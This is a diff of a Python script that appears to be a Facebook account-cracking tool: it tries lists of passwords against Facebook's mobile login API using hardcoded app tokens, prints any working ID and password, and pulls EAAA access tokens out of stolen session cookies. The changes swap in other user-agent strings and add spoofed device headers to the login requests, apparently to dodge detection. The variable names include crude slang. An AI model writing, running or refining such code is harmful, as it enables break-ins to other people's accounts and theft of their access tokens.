@@ -32,7 +32,7 @@ try: import requests as req
 except ModuleNotFoundError: os.system("python -m pip install requests");restart()
 try: from bs4 import BeautifulSoup as parser
 except ModuleNotFoundError: os.system("python -m pip install bs4");restart()
-user_agent = 'Mozilla/5.0 (Linux; Android 7.0; SM-G610F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36'
+user_agent = random.choice(["Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"])
 runtah=["lib/__pycache__"]
 try:
 	hapus(runtah[0])
@@ -747,12 +747,12 @@ class ngewe:
 		for pw in _yan_:
 			try: os.mkdir('results')
 			except: pass
-			user_agent = 'Mozilla/5.0 (Linux; Android 7.0; SM-G610F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36'
+			user_agent = random.choice(["Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"])
 			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': user_agent, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 			ses=req.Session()
 			api="https://b-api.facebook.com/method/auth.login"
 			param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
-			send=ses.get(api, params=params)
+			send=ses.get(api, params=params, headers=headers_)
 			if "session_key" in send.text and "EAAA" in send.text:
 				ok+=1
 				print(f"\r{H}Berhasil                \n{N}ID {M}:{H} {user}                \n{N}PW FB {M}:{H} {pw}{N}                \n",end="")
@@ -880,7 +880,7 @@ class ngewe:
 			
 def yntkts(kuki):
     try:
-        headerz = {'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G610F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36', 'referer': 'https://m.facebook.com/', 'host': 'm.facebook.com', 'origin': 'https://m.facebook.com', 'upgrade-insecure-requests': '1', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control': 'max-age=0', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'content-type': 'text/html; charset=utf-8'}
+        headerz = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 'host': 'm.facebook.com', 'origin': 'https://m.facebook.com', 'upgrade-insecure-requests': '1', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control': 'max-age=0', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'content-type': 'text/html; charset=utf-8'}
         memek  = req.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=headerz, cookies=kuki).text
         kontol = re.search('(EAAA\\w+)', memek)
         kentod = kontol.group(1)
